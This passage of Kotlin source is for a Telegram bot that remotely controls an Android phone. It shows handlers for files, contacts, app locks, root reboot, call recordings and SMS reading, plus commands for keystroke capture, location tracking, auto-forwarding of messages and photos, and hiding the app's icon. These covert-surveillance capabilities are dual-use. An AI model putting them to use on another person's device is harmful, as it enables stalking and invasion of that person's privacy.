                    "cc_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val q = if (sep < 0) "" else rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = if (sep < 0) rest.toIntOrNull() ?: 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderClearCachePage(q, off, editMessageId = messageId)
                    }
                    // ---- Geofence ----
                    "gf_list" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderGeofenceList(editMessageId = messageId)
                    }
                    "gf_events" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderGeofenceEvents(editMessageId = messageId)
                    }
                    "gf_add" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        pendingInput = "gf_new"
                        sendMessage("🗺 <b>Add geofence</b>\n\nSend in format:\n<code>Name, lat, lng, radius_m</code>\n\nExample:\n<code>Home, 28.6139, 77.2090, 200</code>\n\nSend any /command to cancel.")
                    }
                    "gf_del" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        GeofencingHelper.deleteFence(rest)
                        renderGeofenceList(editMessageId = messageId)
                    }
                    "gf_tog" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val fence = GeofencingHelper.listFences().firstOrNull { it.id == rest }
                        if (fence != null) {
                            val updated = fence.copy(enabled = !fence.enabled)
                            GeofencingHelper.saveFence(updated)
                            TelegramApiClient.answerCallbackQuery(token, cqId, if (updated.enabled) "🟢 Enabled" else "⚪ Disabled")
                        }
                        renderGeofenceList(editMessageId = messageId)
                    }
                    // ---- Note editing ----
                    "note_edit" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val n = NoteHelper.getById(rest)
                        if (n == null) {
                            sendMessage("❌ Note not found.")
                        } else {
                            pendingInput = "note_edit_save:$rest"
                            sendMessage("✏️ <b>Edit note: ${htmlEsc(n.title.ifBlank { "(untitled)" })}</b>\n\nSend the new content (first line = title, rest = body).\nCurrent content:\n<pre>${htmlEsc(n.content.take(1000))}</pre>\n\nSend any /command to cancel.")
                        }
                    }
                    // ---- Contact delete ----
                    "con_del_ok" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        try {
                            ContactMediaStoreHelper.deleteByIdsAsync(MainApp.instance, setOf(rest))
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "✅ Contact deleted.")
                        } catch (e: Exception) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Could not delete contact: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "con_del_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Deletion cancelled.")
                    }
                    // ---- Contact groups ----
                    "cg_view" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Loading members…")
                        renderContactGroupMembers(rest, editMessageId = messageId)
                    }
                    "cg_back" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        cmdContactGroups()
                    }
                    // ---- Delete file ----
                    "df_yes" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Deleting…")
                        val path = pathFromToken(rest)
                        if (path == null) {
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "❌ Invalid path token.")
                        } else {
                            val f = File(path)
                            val deleted = f.exists() && (if (f.isDirectory) f.deleteRecursively() else f.delete())
                            val msg = if (deleted) "✅ Deleted: <code>${htmlEsc(f.name)}</code>" else "❌ Could not delete <code>${htmlEsc(f.name)}</code>. Check permissions."
                            if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, msg)
                            else sendMessage(msg)
                        }
                    }
                    "df_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Delete cancelled.")
                    }
                    // ---- Docs ----
                    "doc_get" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Sending document…")
                        val path = pathFromToken(rest)
                        if (path == null) { sendMessage("❌ Invalid token.") } else {
                            val f = File(path)
                            if (!f.exists()) { sendMessage("❌ File not found.") }
                            else if (f.length() > UPLOAD_LIMIT_BYTES) { sendMessage("⚠️ Too large (${humanSize(f.length())}).") }
                            else { sendUploadDocument(); TelegramApiClient.sendDocument(token, chatId, f, "📄 ${htmlEsc(f.name)}") }
                        }
                    }
                    "doc_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        val q = if (sep < 0) "" else rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = if (sep < 0) rest.toIntOrNull() ?: 0 else rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderDocsPage(q, off, editMessageId = messageId)
                    }
                    // ---- Reboot ----
                    "reboot_yes" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via root…")
                        try {
                            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
                            p.waitFor()
                        } catch (e: Exception) {
                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "reboot_adm" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Rebooting…")
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "🔄 Rebooting via Device Admin…")
                        try {
                            val ctx = MainApp.instance
                            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                            val admin = android.content.ComponentName(ctx, com.ismartcoding.plain.receivers.PlainDeviceAdminReceiver::class.java)
                            val m = dpm.javaClass.getMethod("reboot", android.content.ComponentName::class.java)
                            m.invoke(dpm, admin)
                        } catch (e: Exception) {
                            sendMessage("❌ Reboot failed: ${htmlEsc(e.message ?: "")}")
                        }
                    }
                    "reboot_no" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        if (messageId != null) TelegramApiClient.editMessageText(token, chatId, messageId, "↩️ Reboot cancelled.")
                    }
                    // ---- MMS paging ----
                    "mms_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderMmsPage(off, editMessageId = messageId)
                    }
                    // ---- Per-App Locker ----
                    "alk_home" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderAppLockerHome(editMessageId = messageId)
                    }
                    "alk_pg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val off = rest.toIntOrNull() ?: 0
                        renderAppLockerPicker("", off, editMessageId = messageId)
                    }
                    "alk_q" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Send app name…")
                        pendingInput = "alk_search"
                        sendMessage("🔍 Type an app name to search (e.g. <code>WhatsApp</code>), or <code>*</code> to browse all:")
                    }
                    "alk_sel" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) sendMessage("⚠️ Session expired. Send /applocker to start over.")
                        else renderAppLockMenu(pkg, editMessageId = messageId)
                    }
                    "alk_pin" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Send new password…")
                            pendingInput = "alk_setpin:${pkgToken(pkg)}"
                            sendMessage("🔑 Send the new PIN or password for this app (e.g. <code>1234</code> or any text):")
                        }
                    }
                    "alk_view" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            val lock = PerAppLockHelper.getLock(pkg)
                            if (lock == null) {
                                TelegramApiClient.answerCallbackQuery(token, cqId, "No lock set for this app", true)
                            } else {
                                val cred = PerAppLockHelper.decodeCredential(lock.encodedCredential)
                                TelegramApiClient.answerCallbackQuery(token, cqId, "🔑 Password: $cred", true)
                            }
                        }
                    }
                    "alk_rm" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ Session expired. Send /applocker to start over.")
                        } else {
                            PerAppLockHelper.removeLock(pkg)
                            val name = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
                            sendMessage(
                                "🗑 Lock removed for <b>${htmlEsc(name)}</b>.\n\nThe app is now accessible without a password.",
                                replyMarkup = TelegramApiClient.inlineKeyboard(listOf(listOf("◀️ Back to App Locker" to "alk_home")))
                            )
                        }
                    }
                    "alk_unlock" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "Unlocked for 10 min")
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ Session expired. Send /applocker to start over.")
                        } else {
                            PerAppLockHelper.markUnlocked(pkg)
                            renderAppLockMenu(pkg, editMessageId = messageId)
                        }
                    }
                    "alk_status" -> {
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Session expired", true)
                        } else {
                            val secs = PerAppLockHelper.getSessionSecondsRemaining(pkg)
                            val msg = if (secs > 0) {
                                val m = secs / 60; val s = secs % 60
                                "⏱ Unlocked — ${m}m ${s}s remaining"
                            } else {
                                "🔒 Locked — no active session"
                            }
                            TelegramApiClient.answerCallbackQuery(token, cqId, msg, true)
                        }
                    }
                    "alk_attempts" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val pkg = pkgFromToken(rest)
                        if (pkg == null) {
                            sendMessage("⚠️ Session expired. Send /applocker to start over.")
                        } else {
                            val attempts = PerAppLockHelper.getAttempts(pkg).take(10)
                            val name = try { PackageHelper.getLabel(pkg).ifEmpty { pkg } } catch (_: Throwable) { pkg }
                            val sdf = SimpleDateFormat("MM-dd HH:mm:ss", Locale.getDefault())
                            val sb = buildString {
                                append("📋 <b>Attempt Log — ${htmlEsc(name)}</b>\n\n")
                                if (attempts.isEmpty()) {
                                    append("<i>No attempts recorded yet.</i>")
                                } else {
                                    attempts.forEach { a ->
                                        val icon = if (a.success) "✅" else "❌"
                                        append("$icon ${sdf.format(java.util.Date(a.timestamp))}\n")
                                    }
                                }
                            }
                            sendMessage(sb, replyMarkup = TelegramApiClient.inlineKeyboard(listOf(
                                listOf("◀️ Back" to "alk_sel:${pkgToken(pkg)}")
                            )))
                        }
                    }
                    // ---- App Settings callbacks ----
                    "aps_icon_on" -> {
                        val ctx = MainApp.instance
                        LauncherIconHelper.setHidden(ctx, true)
                        LauncherIconHiddenPreference.putAsync(ctx, true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔴 Icon hidden")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_icon_off" -> {
                        val ctx = MainApp.instance
                        LauncherIconHelper.setHidden(ctx, false)
                        LauncherIconHiddenPreference.putAsync(ctx, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🟢 Icon visible")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_lock_on" -> {
                        val ctx = MainApp.instance
                        if (AppLockPinPreference.getAsync(ctx).isEmpty()) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "❌ Set a PIN first", true)
                        } else {
                            AppLockEnabledPreference.putAsync(ctx, true)
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔒 App lock enabled")
                            renderAppSettingsStatus(editMessageId = messageId)
                        }
                    }
                    "aps_lock_off" -> {
                        AppLockEnabledPreference.putAsync(MainApp.instance, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔓 App lock disabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_bio_on" -> {
                        AppLockBiometricEnabledPreference.putAsync(MainApp.instance, true)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🪪 Biometric enabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_bio_off" -> {
                        AppLockBiometricEnabledPreference.putAsync(MainApp.instance, false)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🪪 Biometric disabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_infog_on" -> {
                        val ctx = MainApp.instance
                        if (AppLockPinPreference.getAsync(ctx).isEmpty()) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "❌ Set a PIN first", true)
                        } else {
                            AppInfoGuardEnabledPreference.putAsync(ctx, true)
                            AppInfoGuard.invalidateCache()
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🛡 Info guard enabled")
                            renderAppSettingsStatus(editMessageId = messageId)
                        }
                    }
                    "aps_infog_off" -> {
                        AppInfoGuardEnabledPreference.putAsync(MainApp.instance, false)
                        AppInfoGuard.invalidateCache()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🛡 Info guard disabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_setpin" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔑 Starting PIN setup…")
                        cmdSetPin()
                    }
                    "aps_removepin" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🗑 Starting PIN removal…")
                        cmdRemovePin()
                    }
                    "aps_botpwd_on" -> {
                        TelegramBotPasswordEnabledPreference.putAsync(MainApp.instance, true)
                        botPasswordEnabled = true
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🤖 Bot password enabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_botpwd_off" -> {
                        TelegramBotPasswordEnabledPreference.putAsync(MainApp.instance, false)
                        botPasswordEnabled = false
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🤖 Bot password disabled")
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    "aps_setbotpwd" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔑 Security check required…")
                        cmdSetBotPassword()
                    }
                    "aps_secqa" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "❓ Starting Q&A change…")
                        val ctx = MainApp.instance
                        val question = SecurityQuestionPreference.getAsync(ctx)
                        pendingInput = "secqa_verify"
                        sendMessage(
                            "❓ <b>Change Security Q&A</b>\n\n" +
                            "First, answer the current security question to confirm it's you:\n\n" +
                            "<b><i>${htmlEsc(question)}</i></b>\n\n" +
                            "Send any /command to cancel."
                        )
                    }
                    "aps_openapp" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📱 Opening…")
                        cmdOpenApp()
                    }
                    "aps_openappinfo" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📋 Opening App Info…")
                        cmdOpenOwnAppInfo()
                    }
                    "aps_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderAppSettingsStatus(editMessageId = messageId)
                    }
                    else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot callback error: ${e.message}")
                TelegramApiClient.answerCallbackQuery(token, cqId, "Error: ${e.message?.take(100)}", true)
            }
        }
    }

    private suspend fun cbSendRecording(filename: String) {
        try {
            val safe = filename.substringAfterLast('/').substringAfterLast('\\')
            val file = java.io.File(CallRecorderHelper.recordingsDir(MainApp.instance), safe)
            if (!file.exists() || !file.isFile) {
                sendMessage("❌ Recording not found: <code>${htmlEsc(safe)}</code>")
                return
            }
            sendUploadDocument()
            val meta = CallRecorderHelper.list().firstOrNull { it.filename == safe }
            val durSec = ((meta?.durationMs ?: 0L) / 1000).toInt().coerceAtLeast(1)
            val name = meta?.displayName?.ifBlank { meta.source } ?: safe
            val caption = "🎙 ${htmlEsc(name)} · ${formatDuration(meta?.durationMs ?: 0L)} · ${file.length() / 1024} KB"
            val ok = TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            if (!ok) {
                // Audio send failed (Telegram is picky about codecs); fall back to document.
                TelegramApiClient.sendDocument(token, chatId, file, caption)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not send recording: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun registerCommands() {
        TelegramApiClient.setMyCommands(token, allCommands.map { it.first to it.second.replace(Regex("<[^>]+>"), "") })
    }

    private fun sendTyping() = TelegramApiClient.sendChatAction(token, chatId, "typing")
    private fun sendUploadPhoto() = TelegramApiClient.sendChatAction(token, chatId, "upload_photo")
    private fun sendUploadDocument() = TelegramApiClient.sendChatAction(token, chatId, "upload_document")
    private fun sendRecordVoice() = TelegramApiClient.sendChatAction(token, chatId, "record_voice")
    private fun sendUploadVideo() = TelegramApiClient.sendChatAction(token, chatId, "upload_video")

    private suspend fun cmdStart() {
        sendTyping()
        if (botPasswordEnabled) {
            val now = System.currentTimeMillis()
            val isAuthed = botSessionAuthAt >= 0 && (now - botSessionAuthAt) <= BOT_SESSION_TIMEOUT_MS
            if (!isAuthed) {
                pendingBotPasswordAuth = true
                sendMessage("🔐 <b>Authentication Required</b>\n\nThis bot is password-protected.\nPlease type the password to continue:")
                return
            }
            botSessionAuthAt = System.currentTimeMillis()
        }
        val info = buildString {
            append("🤖 <b>PlainApp Bot</b> — device remote control\n\n")
            append("📱 <b>Device:</b> ${htmlEsc(PhoneHelper.getDeviceName(MainApp.instance))}\n")
            append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
            append("🕐 <b>Time:</b> ${ts}\n\n")
            val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
            if (bat != null) {
                append("🔋 <b>Battery:</b> ${bat.level}% ${if (bat.plugged > 0) "⚡ charging" else ""}\n")
            }
            val call = LiveCallTracker.snapshot()
            if (call.state != "idle") {
                append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
            }
            append("\nSend /help to see all available commands.")
        }
        sendMessage(info)
    }

    private suspend fun sendChunked(text: String) {
        if (text.length <= 4090) {
            TelegramApiClient.sendMessage(token, chatId, text)
            return
        }
        val lines = text.split("\n")
        val chunk = StringBuilder()
        for (line in lines) {
            val sep = if (chunk.isEmpty()) "" else "\n"
            if (chunk.length + sep.length + line.length > 4090) {
                if (chunk.isNotEmpty()) {
                    TelegramApiClient.sendMessage(token, chatId, chunk.toString())
                    kotlinx.coroutines.delay(400)
                    chunk.clear()
                }
            }
            if (chunk.isNotEmpty()) chunk.append("\n")
            chunk.append(line)
        }
        if (chunk.isNotEmpty()) TelegramApiClient.sendMessage(token, chatId, chunk.toString())
    }

    // ─── Command aliases ───────────────────────────────────────────────────────
    // Canonical command → list of its accepted aliases (from the routing `when` block)
    private val cmdAliases: Map<String, List<String>> by lazy {
        mapOf(
            "s"                to listOf("search", "?"),
            "find"             to listOf("findcontact", "lookup", "whois"),
            "mutenotifs"       to listOf("mutenotif", "mutenotifications", "silence"),
            "backup"           to listOf("bak", "backupdata", "exportdata"),
            "restore"          to listOf("restoredata", "restorebackup", "importbackup"),
            "livelocation"     to listOf("live"),
            "tracklocation"    to listOf("trackloc"),
            "keystrokes"       to listOf("keys"),
            "shots"            to listOf("screenshots"),
            "permissions"      to listOf("perms"),
            "openperms"        to listOf("permopen"),
            "reqperm"          to listOf("reqperms", "grantperm", "askperm", "permask"),
            "automations"      to listOf("rules"),
            "newrule"          to listOf("addrule"),
            "newschedule"      to listOf("addschedule"),
            "delrule"          to listOf("deleterule"),
            "feedentries"      to listOf("feedentry"),
            "music"            to listOf("audios"),
            "videos"           to listOf("vidlib"),
            "images"           to listOf("gallery"),
            "pomodoro"         to listOf("pom"),
            "torch"            to listOf("flashlight"),
            "speak"            to listOf("tts"),
            "stopspeak"        to listOf("ttsstop"),
            "findphone"        to listOf("ringphone"),
            "show"             to listOf("banner"),
            "wake"             to listOf("wakescreen"),
            "brightness"       to listOf("bright"),
            "volume"           to listOf("vol"),
            "launch"           to listOf("open"),
            "launches"         to listOf("launchhistory"),
            "livecall"         to listOf("calltracker"),
            "netusage"         to listOf("datausage"),
            "storage"          to listOf("disk"),
            "sim"              to listOf("siminfo", "carrier"),
            "dnd"              to listOf("donotdisturb"),
            "screentime"       to listOf("usagestats", "usage"),
            "blocknumber"      to listOf("blocknum", "blockcall"),
            "nowplaying"       to listOf("np", "player"),
            "forwardsms"       to listOf("smsfwd"),
            "clipboard"        to listOf("clip"),
            "mobiledata"       to listOf("mobile", "data"),
            "bluetooth"        to listOf("bt"),
            "lockscreen"       to listOf("lock"),
            "forwardphotos"    to listOf("autophotos", "photofwd"),
            "airplane"         to listOf("airplanemode", "aeroplane"),
            "schedulesms"      to listOf("schedsms"),
            "batteryhistory"   to listOf("bathistory", "bathist"),
            "clearcache"       to listOf("cacheclean"),
            "geofence"         to listOf("gf", "geofences"),
            "addcontact"       to listOf("newcontact"),
            "deletecontact"    to listOf("delcontact", "rmcontact"),
            "forwardclipboard" to listOf("clipfwd", "clipmon"),
            "soundmeter"       to listOf("sound", "noise", "dblevel"),
            "qrcode"           to listOf("qr"),
            "docs"             to listOf("documents", "document"),
            "filehash"         to listOf("hash", "sha256"),
            "wifiscan"         to listOf("wifilist", "scanwifi"),
            "timeline"         to listOf("activity"),
            "contactgroups"    to listOf("groups", "cgroups"),
            "callnow"          to listOf("dial", "makecall"),
            "update"           to listOf("selfupdate", "apkupdate", "updateapp"),
        )
    }

    private fun cmdSearch(args: List<String>) {
        val query = args.joinToString(" ").trim()
        if (query.isBlank()) {
            pendingInput = "cmd_search"
            sendMessage(
                "🔍 <b>Command Search</b>\n" +
                "━━━━━━━━━━━━━━━━━━━\n\n" +
                "Type a keyword and I'll show all matching commands with descriptions and aliases.\n\n" +
                "<i>Examples:</i>  <code>call</code>  ·  <code>screenshot</code>  ·  <code>wifi</code>  ·  <code>backup</code>  ·  <code>location</code>\n\n" +
                "💡 You can also search directly:\n" +
                "<code>/s call</code>  ·  <code>/s wifi</code>  ·  <code>/s location</code>\n\n" +
                "⏳ Waiting for your keyword… (send any /command to cancel)"
            )
            return
        }
        sendSearchResults(query)
    }

    private fun sendSearchResults(query: String) {
        val q = query.lowercase().trim()
        if (q.isBlank()) {
            sendMessage("❌ Search query was empty. Use <code>/s <keyword></code> or just <code>/s</code> to enter search mode.")
            return
        }

        // Build alias → canonical reverse map
        val aliasToCanon: Map<String, String> = buildMap {
            cmdAliases.forEach { (canon, aliases) -> aliases.forEach { put(it, canon) } }
        }

        data class Match(val key: String, val desc: String, val score: Int)

        val seen = mutableSetOf<String>()
        val matches = mutableListOf<Match>()

        for ((key, desc) in allCommands) {
            if (key in seen) continue
            val aliases = cmdAliases[key] ?: emptyList()
            val score = when {
                key == q                                                -> 4  // exact command name
                aliases.any { it == q }                                 -> 3  // exact alias match
                key.contains(q)                                         -> 2  // command name contains query
                aliases.any { it.contains(q) }                          -> 1  // alias contains query
                desc.lowercase().contains(q)                            -> 0  // description contains query
                aliasToCanon[q] == key                                  -> 2  // typed an alias, map to canon
                else -> continue
            }
            seen.add(key)
            matches.add(Match(key, desc, score))
        }

        matches.sortByDescending { it.score }
        val top = matches.take(12)

        if (top.isEmpty()) {
            sendMessage(
                "🔍 No commands found matching \"<b>${htmlEsc(query)}</b>\"\n\n" +
                "Try: /commands to browse all commands by category\n" +
                "Or search with a shorter keyword — e.g. <code>/s call</code>  <code>/s wifi</code>  <code>/s track</code>"
            )
            return
        }

        val sb = StringBuilder()
        sb.append("🔍 <b>Results for \"${htmlEsc(query)}\"</b>")
        if (matches.size > 12) sb.append(" <i>(top 12 of ${matches.size})</i>")
        sb.append("\n━━━━━━━━━━━━━━━━━━━\n\n")

        for ((key, desc) in top) {
            sb.append("📌 <code>/$key</code>\n")
            sb.append("   📝 $desc\n")
            val aliases = cmdAliases[key]
            if (!aliases.isNullOrEmpty()) {
                sb.append("   🏷 ${aliases.joinToString("  ·  ") { "<code>/$it</code>" }}\n")
            }
            sb.append("\n")
        }

        if (matches.size > 12) {
            sb.append("<i>Showing top 12 — refine your keyword for narrower results.\nUse /commands to browse all categories.</i>")
        } else {
            sb.append("<i>Use /commands to browse all ${allCommands.size} commands by category.</i>")
        }

        sendMessage(sb.toString())
    }

    private suspend fun cmdHelp() {
        sendTyping()
        data class Section(val header: String, val cmds: List<String>)
        val sections = listOf(
            Section("🔍 Search & Help", listOf("s","help","commands")),
            Section("💬 Communication", listOf("messages","sms","sendsms","mms","schedulesms","calls","livecall","callnow","recordings","forwardsms")),
            Section("👥 Contacts", listOf("contacts","find","addcontact","deletecontact","blocknumber")),
            Section("📁 Files & Storage", listOf("files","storage","docs","find","filehash","deletefile")),
            Section("📸 Media", listOf("screenshot","photo","audio","video","music","videos","images","shots","forwardphotos","forwardshots")),
            Section("📱 Apps", listOf("apps","blockapp","unblockapp","blockedapps","launch","screentime","launches","clearcache")),
            Section("📦 Backup & Restore", listOf("backup","restore")),
            Section("📊 Device Info", listOf("device","battery","batteryhistory","batteryalert","location","sim","vpn","permissions","networkinfo","wifiscan","netusage")),
            Section("🔧 Device Controls", listOf("wifi","hotspot","bluetooth","airplane","mobiledata","dnd","brightness","volume","torch","lockscreen","reboot")),
            Section("🌀 Sensors", listOf("gyroscope","compass","barometer","steps","proximity","soundmeter")),
            Section("🛰 Tracking & Monitoring", listOf("track","livelocation","tracklocation","keystrokes","keytop","geofence","forwardgeofence","timeline")),
            Section("⚙️ Automation", listOf("automations","newrule","newschedule","delrule","runrule","togglerule")),
            Section("📝 Productivity", listOf("notes","addnote","editnote","bookmarks","addbookmark","feeds","feedentries","pomodoro","clipboard","forwardclipboard","qrcode")),
            Section("🔔 Notifications", listOf("notifications","mutenotifs","logs")),
            Section("🚨 Alerts & Actions", listOf("findphone","vibrate","speak","stopspeak","toast","show","wake","setalarm","batteryalert")),
            Section("⏰ Scheduling", listOf("schedulesms","setalarm","bedtime","newschedule")),
            Section("📡 Auto-Forward", listOf("forwardsms","forwardphotos","forwardclipboard","forwardshots","forwardgeofence","forwardfiles","fwdfiles","filestats","retryfailed")),
            Section("🔐 Security & App Settings", listOf("appsettings","applocker","hideicon","applock","biometric","appinfog","setpin","removepin","openapp","openappinfo","openwebsettings","botpassword","setbotpassword","securityqa","update","intruders","permissions","openperms","reqperm")),
            Section("🤖 Bot", listOf("start","help","commands","stop","nowplaying")),
        )
        val cmdMap = allCommands.toMap()
        val shown = mutableSetOf<String>()
        val sb = StringBuilder("📖 <b>PlainApp Bot — Command Reference</b>\n")
        sb.append("<i>${allCommands.size} commands total</i>\n\n")
        for (section in sections) {
            val sectionCmds = section.cmds.filter { it in cmdMap && shown.add(it) }
            if (sectionCmds.isEmpty()) continue
            sb.append("${section.header}\n")
            for (cmd in sectionCmds) {
                val desc = cmdMap[cmd] ?: continue
                val cleanDesc = desc.replace(Regex("<[^>]+>"), "").substringBefore(" — ").let { desc }
                sb.append("  /<code>$cmd</code> — $cleanDesc\n")
            }
            sb.append("\n")
        }
        // Any not yet shown
        val remaining = allCommands.filter { it.first !in shown }
        if (remaining.isNotEmpty()) {
            sb.append("🔹 Other\n")
            remaining.forEach { (cmd, desc) -> sb.append("  /<code>$cmd</code> — $desc\n") }
            sb.append("\n")
        }
        sb.append("💡 <i>Live alerts auto-forward for calls, SMS, notifications & location.</i>")
        sendChunked(sb.toString())
    }

    private suspend fun cmdMessages(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty() && args.firstOrNull()?.toIntOrNull() == null) args.joinToString(" ").trim() else ""
        lastMessagesQuery = query
        renderMessagesPage(query, editMessageId = null)
    }

    private suspend fun renderMessagesPage(query: String, editMessageId: Long?) {
        lastMessagesQuery = query
        try {
            val limit = 20
            val convs = SmsConversationHelper.searchConversationsAsync(MainApp.instance, query, limit, 0)
            val title = if (query.isEmpty()) "💬 <b>SMS Conversations</b>" else "💬 <b>SMS Conversations</b> · <i>${htmlEsc(query)}</i>"
            if (convs.isEmpty()) {
                val msg = "$title\n\nNo conversations found."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("$title (${convs.size})\n<i>Tap a conversation to open the thread.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            convs.forEachIndexed { i, c ->
                val addr = c.address.ifBlank { "Thread ${c.id}" }
                sb.append("${i + 1}. 📱 <b>${htmlEsc(addr)}</b>")
                if (!c.read) sb.append("  🔴")
                sb.append("\n   💬 ${htmlEsc(c.snippet.take(80))}\n")
                sb.append("   🕐 ${fmtTime(c.date.toEpochMilliseconds())}  ·  📬 ${c.messageCount} msgs\n\n")
                val label = "${i + 1}. ${addr.take(20)}"
                rows.add(listOf(label to "sms_open:${c.id}"))
            }
            rows.add(listOf("🔍 Search messages" to "messages_q", "🔄 Refresh" to "messages_refresh"))
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read SMS: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private suspend fun cmdSmsThread(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /sms &lt;thread_id&gt;\n\nUse /messages to list conversations and tap one to open."); return }
        sendTyping()
        val threadId = args[0].trim().filter { it.isDigit() }
        if (threadId.isEmpty()) { sendMessage("❌ Invalid thread id: <code>${htmlEsc(args[0])}</code>"); return }
        renderSmsThreadPage(threadId, offset = 0, editMessageId = null)
    }

    private suspend fun renderSmsThreadPage(threadId: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
